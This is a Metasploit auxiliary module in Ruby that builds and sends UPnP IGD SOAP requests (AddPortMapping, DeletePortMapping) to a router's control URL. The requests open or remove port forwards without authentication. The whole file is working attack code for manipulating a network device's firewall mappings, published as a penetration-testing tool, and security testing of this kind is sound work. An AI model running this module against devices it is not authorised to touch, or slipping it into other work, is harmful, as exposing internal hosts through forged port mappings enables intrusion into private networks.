##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'nokogiri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'           => 'UPnP IGD SOAP Port Mapping Utility',
      'Description'    => %q{
        Manage port mappings on UPnP IGD-capable device using the AddPortMapping and
        DeletePortMapping SOAP requests
      },
      'Author'         =>
        [
          'St0rn <fabien[at]anbu-pentest.com>', # initial module
          'Jon Hart <jon_hart[at]rapid7.com>'   # module cleanup and refactoring
        ],
      'License'        => MSF_LICENSE,
      'References'     => [['URL', 'http://www.upnp-hacks.org/igd.html']],
      'DefaultAction'  => 'ADD',
      'Actions'        =>
        [
          [ 'ADD',
            {
              'Description' => 'Use the AddPortMapping SOAP command to open and forward a port',
              'SOAP_ACTION' => 'AddPortMapping'
            }
          ],
          [ 'DELETE',
            {
              'Description' => 'Use the DeletePortMapping SOAP command to remove a port forwarding',
              'SOAP_ACTION' => 'DeletePortMapping'
            }
          ]
        ],
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'UPnP control URL', '/' ]),
        OptAddress.new('INTERNAL_CLIENT', [false, 'Internal client hostname/IP']),
        OptAddress.new('EXTERNAL_CLIENT', [false, 'External client hostname/IP']),
        OptEnum.new('PROTOCOL', [true, 'Transport level protocol to map', 'TCP', %w(TCP UDP)]),
        OptInt.new('INTERNAL_PORT', [false, 'Internal port']),
        OptInt.new('EXTERNAL_PORT', [true, 'External port']),
        OptInt.new('LEASE_DURATION', [false, 'Lease time for mapping, in seconds', 3600])
      ],
      self.class
    )
  end

  def internal_port
    @internal_port ||= datastore['INTERNAL_PORT']
  end

  def internal_client
    @internal_client ||= datastore['INTERNAL_CLIENT']
  end

  def external_port
    @external_port ||= datastore['EXTERNAL_PORT']
  end

  def external_client
    @external_client ||= datastore['EXTERNAL_CLIENT']
  end

  def lease_duration
    @lease_duration ||= datastore['LEASE_DURATION']
  end

  def protocol
    @protocol ||= datastore['PROTOCOL']
  end

  def soap_action
    @soap_action ||= action.opts['SOAP_ACTION']
  end

  def build_soap
    builder = ::Nokogiri::XML::Builder.new do |xml|
      xml['SOAP-ENV'].Envelope('xmlns:SOAP-ENV' => 'http://schemas.xmlsoap.org/soap/envelope', 'SOAP-ENV:encodingStyle' => 'http://schemas.xmlsoap.org/soap/encoding/') do
        xml['SOAP-ENV'].Body do
          xml['m'].send(soap_action, 'xmlns:m' => 'urn:schemas-upnp-org:service:WANIPConnection:1') do
            case action.name
            when 'ADD'
              xml.NewPortMappingDescription(Rex::Text.rand_text_alpha(8)) { xml.parent.namespace = nil }
              xml.NewLeaseDuration(lease_duration) { xml.parent.namespace = nil }
              xml.NewInternalClient(internal_client) { xml.parent.namespace = nil }
              xml.NewEnabled(1) { xml.parent.namespace = nil }
              xml.NewExternalPort(external_port) { xml.parent.namespace = nil }
              xml.NewRemoteHost(external_client) { xml.parent.namespace = nil }
              xml.NewProtocol(protocol) { xml.parent.namespace = nil }
              xml.NewInternalPort(internal_port) { xml.parent.namespace = nil }
            when 'DELETE'
              xml.NewExternalPort(external_port) { xml.parent.namespace = nil }
              xml.NewRemoteHost(external_client) { xml.parent.namespace = nil }
              xml.NewProtocol(protocol) { xml.parent.namespace = nil }
            end
          end
        end
      end
    end
    builder.to_xml
  end

  def run
    res = send_request_cgi(
      'uri'           => normalize_uri(target_uri.path),
      'method'        => 'POST',
      'content-type'  => 'text/xml;charset="utf-8"',
      'data'          => build_soap,
      'headers'       => {
        'SoapAction'  => "urn:schemas-upnp-org:service:WANIPConnection:1##{soap_action}"
      }
    )

    external_map = "#{external_client ? external_client : 'any'}:#{external_port}/#{protocol}"
    internal_map = "#{internal_client ? internal_client : 'any'}:#{internal_port}/#{protocol}"
    map = "#{external_map} -> #{internal_map}"

    if res
      if res.code == 200
        print_good("#{peer} #{map} #{action.name} succeeded")
      else
        print_error("#{peer} #{map} #{action.name} failed with response code #{res.code}")
        vprint_status("#{res.body}")
      end
    else
      print_error("#{peer} no response for #{map} #{action.name}")
    end
  end
end
